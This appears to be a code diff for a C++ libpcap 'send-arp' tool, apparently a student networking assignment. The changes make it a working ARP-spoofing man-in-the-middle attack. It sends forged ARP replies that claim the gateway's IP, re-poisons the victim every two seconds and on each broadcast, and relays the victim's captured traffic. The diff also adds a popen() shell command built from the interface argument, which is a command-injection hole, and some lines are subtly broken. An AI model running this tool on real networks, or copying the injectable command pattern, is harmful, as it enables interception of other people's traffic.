@@ -8,6 +8,9 @@
 #include <sys/ioctl.h>
 #include <net/if.h>
 #include <unistd.h>
+#include <array>
+#include <thread>
+#include <chrono>
 #include "ethhdr.h"
 #include "arphdr.h"
 #include "pcap_hdr.h"
@@ -29,15 +32,29 @@ void print_port(u_int16_t m){
 }
 
 std::string getMacAddress(const std::string& interfaceName) {
-    std::ifstream file("/sys/class/net/" + interfaceName + "/address");
-    if (!file) {
-        std::cerr << "Failed to open file: /sys/class/net/" << interfaceName << "/address" << std::endl;
+    char cmd[256];
+    std::snprintf(cmd, sizeof(cmd), "ifconfig %s | grep ether | awk '{print $2}'", interfaceName.c_str());
+    std::array<char, 128> buffer;
+    std::string macAddress;
+    
+    FILE* pipe = popen(cmd, "r");
+    if (!pipe) {
+        throw std::runtime_error("popen() failed!");
+    }
+    
+    while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
+        macAddress += buffer.data();
+    }
+    
+    int exitCode = pclose(pipe);
+    
+    if (exitCode != 0) {
+        std::cerr << "Error: Command exited with code " << exitCode << std::endl;
         return "";
     }
-
-    std::stringstream buffer;
-    buffer << file.rdbuf();
-    return buffer.str();
+    
+    macAddress.pop_back(); // remove newline character
+    return macAddress;
 }
 
 std::string getIpAddress(const std::string& interfaceName) {
@@ -69,6 +86,34 @@ void usage() {
     printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
 }
 
+
+void myFunction(char *dev, const std::string& macAddress, Mac mac_send, const std::string& senderip,const std::string& gatewayip) {
+    EthArpPacket fpacket2;
+    char errbuf[PCAP_ERRBUF_SIZE];
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+
+
+    fpacket2.eth_.smac_ = Mac(macAddress);//ME
+    fpacket2.eth_.dmac_ = mac_send;
+    fpacket2.eth_.type_ = htons(EthHdr::Arp);
+
+    fpacket2.arp_.hrd_ = htons(ArpHdr::ETHER);
+    fpacket2.arp_.pro_ = htons(EthHdr::Ip4);
+    fpacket2.arp_.hln_ = Mac::SIZE;
+    fpacket2.arp_.pln_ = Ip::SIZE;
+    fpacket2.arp_.op_ = htons(ArpHdr::Reply);
+    fpacket2.arp_.smac_ = Mac(macAddress);//MY MAC
+    fpacket2.arp_.sip_ = htonl(Ip(gatewayip));//gateway ip
+    fpacket2.arp_.tmac_ =mac_send; //WHAT IS THE MAC?
+    fpacket2.arp_.tip_ = htonl(Ip(senderip));//YOUR IP
+
+
+    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&fpacket2), sizeof(EthArpPacket));
+    if (res != 0) {
+        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+    }
+}
+
 int main(int argc, char* argv[]){
     if (argc < 4 || argc % 2 != 0) {
         usage();
@@ -84,13 +129,16 @@ int main(int argc, char* argv[]){
     cout << "IP Address: " << ipAddress << endl;
 
     char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
     if (handle == nullptr) {
         fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
         return -1;
     }
 
+
     for (int i = 2; i < argc - 1; i += 2) { 
+
+        
 
         EthArpPacket packet_send;
         EthArpPacket packet_tar;
@@ -224,24 +272,31 @@ int main(int argc, char* argv[]){
         fpacket1.arp_.pro_ = htons(EthHdr::Ip4);
         fpacket1.arp_.hln_ = Mac::SIZE;
         fpacket1.arp_.pln_ = Ip::SIZE;
-        fpacket1.arp_.op_ = htons(ArpHdr::Request);
+        fpacket1.arp_.op_ = htons(ArpHdr::Reply);
         fpacket1.arp_.smac_ = Mac(macAddress);//MY MAC
         fpacket1.arp_.sip_ = htonl(Ip(argv[i + 1]));//gateway ip
         fpacket1.arp_.tmac_ =mac_send; //WHAT IS THE MAC?
-        fpacket1.arp_.tip_ = htonl(Ip(argv[i]));//YOUR IP
-
+        fpacket1.arp_.tip_ = htonl(Ip(argv[i]));//sender ip
+        
 
         res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&fpacket1), sizeof(EthArpPacket));
         if (res != 0) {
             fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
         }
 
+
+        std::thread t([&]() {
+        while (true) {
+            myFunction(dev, macAddress, mac_send, argv[i], argv[i+1]);  // 원하는 함수 호출
+            std::this_thread::sleep_for(std::chrono::seconds(2));  // 2초 대기
+        }
+        });
+
         
         //우회된 패킷 받기, 추가코드 start
-        struct pcap_pkthdr* header3;
-        const u_char* reply_packet3;
-
         while (true) {
+            struct pcap_pkthdr* header3;
+            const u_char* reply_packet3;
             int ret = pcap_next_ex(handle, &header3, &reply_packet3);
             if (ret == 0) {
                 printf("Timeout, no packet received\n");
@@ -262,28 +317,52 @@ int main(int argc, char* argv[]){
         	struct libnet_ethernet_hdr*  eth_hdr = (struct libnet_ethernet_hdr *)(reply_packet3);
             struct libnet_ipv4_hdr* ip4_hdr = (struct libnet_ipv4_hdr *)(reply_packet3 + sizeof(struct libnet_ethernet_hdr));
 
+            // printf("현재 캡처 MAC:  %s and %s, sender's MAC: %s, gateway's MAC: %s, my mac: %s\n",
+            //         static_cast<std::string>(Mac(eth_hdr->ether_shost)).c_str(),
+            //         static_cast<std::string>(Mac(eth_hdr->ether_dhost)).c_str(),
+            //         static_cast<std::string>(mac_send).c_str(),
+            //         static_cast<std::string>(mac_tar).c_str(),
+            //         static_cast<std::string>(Mac(macAddress)).c_str()
+            //         );
+
             if (lay2_eth_hdr->type_ == htons(EthHdr::Arp)){
                 printf("this is arp packet\n");
-                continue;
+                if(Mac(eth_hdr->ether_dhost) == Mac(Mac::broadcastMac())){
+                    printf("sender's broadcast!\n ");
+                    EthArpPacket fpacket2;
+
+                    fpacket2.eth_.smac_ = Mac(macAddress);//ME
+                    fpacket2.eth_.dmac_ = mac_send;
+                    fpacket2.eth_.type_ = htons(EthHdr::Arp);
+
+                    fpacket2.arp_.hrd_ = htons(ArpHdr::ETHER);
+                    fpacket2.arp_.pro_ = htons(EthHdr::Ip4);
+                    fpacket2.arp_.hln_ = Mac::SIZE;
+                    fpacket2.arp_.pln_ = Ip::SIZE;
+                    fpacket2.arp_.op_ = htons(ArpHdr::Reply);
+                    fpacket2.arp_.smac_ = Mac(macAddress);//MY MAC
+                    fpacket2.arp_.sip_ = htonl(Ip(argv[i + 1]));//gateway ip
+                    fpacket2.arp_.tmac_ =mac_send; //WHAT IS THE MAC?
+                    fpacket2.arp_.tip_ = htonl(Ip(argv[i]));//YOUR IP
+
+
+                    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&fpacket2), sizeof(EthArpPacket));
+                    if (res != 0) {
+                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+                    }
+                }
             }
                 
-            printf("checking point!================");
-            print_ip(&(ip4_hdr->ip_src));
-            printf(", ");
-            print_ip(&(ip4_hdr->ip_dst));
-            printf("\n");
-            printf("현재 캡처 MAC:  %s and %s, sender's MAC: %s, gateway's MAC: %s\n",
-                    static_cast<std::string>(Mac(eth_hdr->ether_shost)).c_str(),
-                    static_cast<std::string>(Mac(eth_hdr->ether_dhost)).c_str(),
-                    static_cast<std::string>(mac_send).c_str(),
-                    static_cast<std::string>(mac_tar).c_str()
-                    );
-
-
-            if (Mac(eth_hdr->ether_shost) == mac_send && Ip(ip4_hdr->ip_dst.s_addr) == Ip(argv[i+1])){
+            else if (Mac(eth_hdr->ether_shost) == mac_send && lay2_eth_hdr->type_ != htons(EthHdr::Arp)){
                 printf("packet send!\n");
-                //mac address modify
 
+                printf("현재 캡처 MAC:  %s and %s\n",
+                    static_cast<std::string>(Mac(eth_hdr->ether_shost)).c_str(),
+                    static_cast<std::string>(Mac(eth_hdr->ether_dhost)).c_str()
+                    );
+                //mac address modify
+                
+                lay2_eth_hdr->dmac_ = mac_tar;
                 Mac(eth_hdr->ether_dhost) = mac_tar;
                 Mac(eth_hdr->ether_shost) = macAddress;
 
@@ -293,8 +372,6 @@ int main(int argc, char* argv[]){
                     fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                 }
             }
-            else
-                continue;
      
         }
     }
